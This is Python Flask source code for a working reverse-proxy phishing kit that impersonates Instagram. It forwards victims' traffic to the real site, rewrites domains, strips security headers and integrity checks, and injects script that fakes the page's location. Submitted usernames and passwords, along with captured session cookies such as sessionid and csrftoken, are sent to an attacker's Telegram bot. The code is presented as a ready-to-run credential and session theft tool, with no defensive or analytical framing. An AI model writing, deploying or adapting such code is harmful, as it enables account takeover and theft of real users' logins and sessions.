import os, re, json, urllib3, requests
from flask import Flask, request, make_response
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = Flask(__name__)
a.secret_key = os.urandom(32).hex()

T = os.environ.get("T_BOT", ""); C = os.environ.get("T_CHAT", "")

class E:
    def __init__(self):
        self.d = "www.instagram.com"
        self.p = ["www.instagram.com", "instagram.com", "static.cdninstagram.com", "scontent.cdninstagram.com", "www.facebook.com", "facebook.com"]

    def n(self, m):
        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
        except: pass

    def r(self, t, h):
        for d in self.p:
            t = t.replace(f"https://{d}", f"https://{h}")
            t = t.replace(f"//{d}", f"//{h}")
        t = re.sub(r'integrity="[^"]+"', '', t)
        t = t.replace('Content-Security-Policy', 'X-Ignored-CSP')
        
        if '<head>' in t:
            i = f"""
            <script>
                Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});
                Object.defineProperty(window.location, 'host', {{ get: function() {{ return '{self.d}'; }} }});
                Object.defineProperty(window.location, 'origin', {{ get: function() {{ return 'https://{self.d}'; }} }});
                if (typeof window._sharedData !== 'undefined') {{
                    window._sharedData.config.viewerId = null;
                    window._sharedData.config.csrf_token = 'fake_csrf_token';
                }}
            </script>
            """
            t = t.replace('<head>', f'<head>{i}')
        return t

e = E()

@a.route('/', defaults={'x': ''})
@a.route('/<path:x>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def f(x):
    h = request.headers.get('Host', '').split(':')[0]
    u = urljoin(f"https://{e.d}", x)
    if request.query_string: u += '?' + request.query_string.decode()

    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
    H['Host'] = e.d

    if request.method == 'POST':
        D = request.form.to_dict() or request.get_json(silent=True) or {}
        
        if 'username' in D and 'enc_password' in D:
            e.n(f"🔐 <b>Credentials:</b>\nUser: <code>{D['username']}</code>\nPass: <code>{D['enc_password']}</code>")
        elif 'username' in D and 'password' in D:
            e.n(f"🔐 <b>Credentials:</b>\nUser: <code>{D['username']}</code>\nPass: <code>{D['password']}</code>")

    try:
        R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
        
        B = R.content
        if any(x in R.headers.get('Content-Type', '') for x in ['html', 'javascript', 'json']):
            try: B = e.r(R.content.decode('utf-8', errors='ignore'), h).encode()
            except: pass

        r = make_response(B)
        r.status_code = R.status_code

        for k, v in R.headers.items():
            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'x-frame-options']:
                r.headers[k] = v

        
        if 'sessionid' in R.cookies:
            cookies_to_send = {
                'sessionid': R.cookies.get('sessionid', ''),
                'ds_user_id': R.cookies.get('ds_user_id', ''),
                'csrftoken': R.cookies.get('csrftoken', ''),
                'mid': R.cookies.get('mid', ''),
                'ig_did': R.cookies.get('ig_did', ''),
                'rur': R.cookies.get('rur', ''),
            }
            
            formatted_cookies = '; '.join([f"{key}={value}" for key, value in cookies_to_send.items() if value])
            e.n(f"🔥 <b>FULL SESSION CAPTURED!</b>\n<code>{formatted_cookies}</code>")

        if R.status_code in [301, 302, 303, 307, 308]:
            l = R.headers.get('Location', '').replace(e.d, h)
            r.headers['Location'] = l

        return r
    except: return "X", 503

if __name__ == '__main__':
    a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
